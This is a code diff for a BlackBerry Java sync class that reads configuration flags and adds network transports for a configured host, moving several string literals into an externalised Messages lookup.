@@ -9,6 +9,7 @@
 package blackberry.action.sync;
 
 import net.rim.device.api.system.DeviceInfo;
+import blackberry.Messages;
 import blackberry.action.sync.transport.BesTransport;
 import blackberry.action.sync.transport.BisTransport;
 import blackberry.action.sync.transport.DirectTransport;
@@ -21,7 +22,7 @@ import blackberry.debug.DebugLevel;
 
 public class SyncActionInternet extends SyncAction {
     //#ifdef DEBUG
-    private static Debug debug = new Debug("SyncActionInt", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("SyncActionInt", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     protected boolean wifiForced;
@@ -49,15 +50,15 @@ public class SyncActionInternet extends SyncAction {
     protected boolean parse(final ConfAction params) {
         try {
             wifi = true;
-            gprs = params.getBoolean("cell");
-            wifi = params.getBoolean("wifi");
+            gprs = params.getBoolean(Messages.getString("f.1")); //$NON-NLS-1$
+            wifi = params.getBoolean(Messages.getString("f.2")); //$NON-NLS-1$
             wifiForced = wifi;
-            host = params.getString("host");
-            stop = params.getBoolean("stop");
+            host = params.getString(Messages.getString("f.3")); //$NON-NLS-1$
+            stop = params.getBoolean(Messages.getString("f.4")); //$NON-NLS-1$
         } catch (final ConfigurationException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("parse");
+            debug.error(Messages.getString("f.5")); //$NON-NLS-1$
             //#endif
         }
 
@@ -87,42 +88,42 @@ public class SyncActionInternet extends SyncAction {
 
     //#ifdef DEBUG
     public String toString() {
-        return "SyncInternet ";
+        return "SyncInternet "; //$NON-NLS-1$
     }
     //#endif
 
     protected boolean initTransport() {
         if (wifi) {
             //#ifdef DEBUG
-            debug.trace("initTransport adding WifiTransport");
+            debug.trace("initTransport adding WifiTransport"); //$NON-NLS-1$
             //#endif
             transports.addElement(new WifiTransport(host, wifiForced));
         }
 
         if (bes) {
             //#ifdef DEBUG
-            debug.trace("initTransport adding BesTransport");
+            debug.trace("initTransport adding BesTransport"); //$NON-NLS-1$
             //#endif
             transports.addElement(new BesTransport(host));
         }
 
         if (bis) {
             //#ifdef DEBUG
-            debug.trace("initTransport adding BisTransport");
+            debug.trace("initTransport adding BisTransport"); //$NON-NLS-1$
             //#endif
             transports.addElement(new BisTransport(host));
         }
 
         if (wap2) {
             //#ifdef DEBUG
-            debug.trace("initTransport adding Wap2Transport");
+            debug.trace("initTransport adding Wap2Transport"); //$NON-NLS-1$
             //#endif
             transports.addElement(new Wap2Transport(host));
         }
 
         if (gprs) {
             //#ifdef DEBUG
-            debug.trace("initTransport adding DirectTransport");
+            debug.trace("initTransport adding DirectTransport"); //$NON-NLS-1$
             //#endif
             transports.addElement(new DirectTransport(host));
         }
